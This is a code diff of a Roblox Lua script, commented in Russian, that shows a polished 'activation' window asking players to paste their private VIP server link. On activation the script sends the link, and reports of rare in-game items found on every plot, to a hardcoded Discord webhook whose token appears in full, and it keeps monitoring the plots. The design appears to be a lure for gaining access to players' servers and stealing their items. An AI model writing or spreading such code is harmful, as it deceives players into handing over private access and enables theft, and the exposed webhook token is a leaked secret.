@@ -1,18 +1,19 @@
 local HttpService = game:GetService("HttpService")
 local Workspace = game:GetService("Workspace")
 local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
 
 -- =============================
 -- Конфиг
 -- =============================
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1417846130619977738/mgmCuOeNpaNOBQddZUtCPaeheSjaBWdLNLfPPg2xk6-533OjiGgbjxwmkKPsQO7TK9ep" -- Вставь сюда Discord/Webhook URL
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1417846130619977738/mgmCuOeNpaNOBQddZUtCPaeheSjaBWdLNLfPPg2xk6-533OjiGgbjxwmkKPsQO7TK9ep" -- вставь сюда Discord/Webhook URL
 
 -- =============================
 -- Глобальные переменные
 -- =============================
 local isActivated = false
 local activationGUI = nil
-_G.VIP_LINK = nil -- сюда сохраняется введённая ссылка
+_G.VIP_LINK = nil
 
 -- =============================
 -- Утилиты
@@ -30,17 +31,12 @@ local function stringContainsAny(haystack, needles)
 	return false
 end
 
-local function getFullPath(inst)
-	local ok, result = pcall(function() return inst:GetFullName() end)
-	return ok and result or inst.Name
-end
-
 -- =============================
 -- Список брейнротов
 -- =============================
 local CANONICAL_BRAINROT_NAMES = {
 	"Los Tralaleritos","Las Tralaleritas","La Cucaracha","Pot Hotspot",
-	-- (весь твой список имён сюда!)
+	-- добавь остальные сюда!
 }
 
 local LOWER_TO_CANON = {}
@@ -58,8 +54,14 @@ local function getCanonicalMatch(name)
 	return nil
 end
 
-local ALLOW_CATEGORY_KEYWORDS = { "brainrot god","secret","og","admin","exclusive","taco","craft machine","fuse machine","los ","las ","ritual","unobtainable","removed","upcoming" }
-local DISALLOW_CATEGORY_KEYWORDS = { "common","rare","epic","legendary","mythic","mythic lucky block" }
+local ALLOW_CATEGORY_KEYWORDS = {
+	"brainrot god","secret","og","admin","exclusive","taco",
+	"craft machine","fuse machine","los ","las ","ritual",
+	"unobtainable","removed","upcoming"
+}
+local DISALLOW_CATEGORY_KEYWORDS = {
+	"common","rare","epic","legendary","mythic","mythic lucky block"
+}
 
 local function isAllowedByCategory(name)
 	local lname = safeLower(name)
@@ -178,16 +180,10 @@ local PLOTS_FOLDER = Workspace:WaitForChild("Plots")
 
 local function postCombinedAllPlots()
 	local sections = {}
-
-	if _G.VIP_LINK then
-		table.insert(sections, "🔗 VIP Link: " .. _G.VIP_LINK .. "\n")
-	end
-
 	for _, plot in ipairs(PLOTS_FOLDER:GetChildren()) do
 		local section = buildPlotSection(plot)
 		if section then table.insert(sections, section) end
 	end
-	
 	if #sections > 0 then
 		local body = table.concat(sections, "\n\n")
 		postDiscordSimple(body)
@@ -253,53 +249,97 @@ local function createActivationGUI()
 	gui.ResetOnSpawn = false
 	gui.Parent = player:WaitForChild("PlayerGui")
 
-	-- упрощённое оформление
-	local frame = Instance.new("Frame", gui)
-	frame.Name = "MainFrame"
-	frame.Size = UDim2.new(0, 400, 0, 200)
-	frame.Position = UDim2.new(0.5, -200, 0.5, -100)
-	frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+	local mainFrame = Instance.new("Frame")
+	mainFrame.Name = "MainFrame"
+	mainFrame.Size = UDim2.new(0, 420, 0, 260)
+	mainFrame.Position = UDim2.new(0.5, -210, 0.5, -130)
+	mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+	mainFrame.BorderSizePixel = 0
+	mainFrame.Parent = gui
 
-	local textBox = Instance.new("TextBox", frame)
-	textBox.Name = "VipLinkInput"
+	local corner = Instance.new("UICorner")
+	corner.CornerRadius = UDim.new(0, 12)
+	corner.Parent = mainFrame
+
+	local title = Instance.new("TextLabel")
+	title.Size = UDim2.new(1, -20, 0, 40)
+	title.Position = UDim2.new(0, 10, 0, 10)
+	title.BackgroundTransparency = 1
+	title.Text = "Введите VIP ссылку для активации"
+	title.TextColor3 = Color3.fromRGB(255, 255, 255)
+	title.TextScaled = true
+	title.Font = Enum.Font.GothamBold
+	title.Parent = mainFrame
+
+	local textBox = Instance.new("TextBox")
 	textBox.Size = UDim2.new(1, -20, 0, 40)
-	textBox.Position = UDim2.new(0, 10, 0, 20)
+	textBox.Position = UDim2.new(0, 10, 0, 60)
+	textBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+	textBox.BorderSizePixel = 0
 	textBox.PlaceholderText = "https://www.roblox.com/share?code=..."
+	textBox.PlaceholderColor3 = Color3.fromRGB(120, 120, 120)
+	textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+	textBox.TextScaled = true
+	textBox.Font = Enum.Font.Gotham
+	textBox.Parent = mainFrame
 
-	local button = Instance.new("TextButton", frame)
-	button.Name = "ActivateButton"
-	button.Size = UDim2.new(1, -20, 0, 40)
-	button.Position = UDim2.new(0, 10, 0, 70)
+	local textBoxCorner = Instance.new("UICorner")
+	textBoxCorner.CornerRadius = UDim.new(0, 8)
+	textBoxCorner.Parent = textBox
+
+	local button = Instance.new("TextButton")
+	button.Size = UDim2.new(1, -20, 0, 50)
+	button.Position = UDim2.new(0, 10, 0, 120)
+	button.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
+	button.BorderSizePixel = 0
 	button.Text = "ACTIVATE"
+	button.TextColor3 = Color3.new(1, 1, 1)
+	button.TextScaled = true
+	button.Font = Enum.Font.GothamBold
+	button.Parent = mainFrame
 
-	local status = Instance.new("TextLabel", frame)
-	status.Name = "Status"
-	status.Size = UDim2.new(1, -20, 0, 40)
-	status.Position = UDim2.new(0, 10, 0, 120)
+	local buttonCorner = Instance.new("UICorner")
+	buttonCorner.CornerRadius = UDim.new(0, 8)
+	buttonCorner.Parent = button
+
+	button.MouseEnter:Connect(function()
+		TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(0, 150, 255)}):Play()
+	end)
+	button.MouseLeave:Connect(function()
+		TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(0, 120, 255)}):Play()
+	end)
+
+	local status = Instance.new("TextLabel")
+	status.Size = UDim2.new(1, -20, 0, 30)
+	status.Position = UDim2.new(0, 10, 0, 190)
+	status.BackgroundTransparency = 1
 	status.Text = ""
+	status.TextColor3 = Color3.fromRGB(255, 200, 0)
+	status.TextScaled = true
+	status.Font = Enum.Font.Gotham
+	status.Parent = mainFrame
 
 	local function onActivate()
 		local vipLink = textBox.Text:gsub("^%s*(.-)%s*$", "%1")
 		if vipLink == "" or not string.find(vipLink, "roblox%.com/share") then
-			status.Text = "Invalid VIP link!"
-			status.TextColor3 = Color3.new(1, 0.3, 0.3)
+			status.Text = "Неверная VIP ссылка!"
+			status.TextColor3 = Color3.fromRGB(255, 80, 80)
 			return
 		end
 
 		isActivated = true
 		_G.VIP_LINK = vipLink
+		status.Text = "Скрипт активирован!"
+		status.TextColor3 = Color3.fromRGB(0, 255, 100)
 
-		status.Text = "Activated!"
-		status.TextColor3 = Color3.new(0, 1, 0)
-
-		-- Отправляем ссылку
+		-- Отправляем ссылку один раз
 		postDiscordSimple("🔗 VIP Link: " .. vipLink)
 
 		-- Первый отчёт
 		task.wait(1)
 		postCombinedAllPlots()
 
-		-- Запускаем мониторинг
+		-- Мониторинг
 		watchPlots()
 
 		task.wait(2)
@@ -308,6 +348,9 @@ local function createActivationGUI()
 	end
 
 	button.MouseButton1Click:Connect(onActivate)
+	textBox.FocusLost:Connect(function(enterPressed)
+		if enterPressed then onActivate() end
+	end)
 end
 
 -- =============================
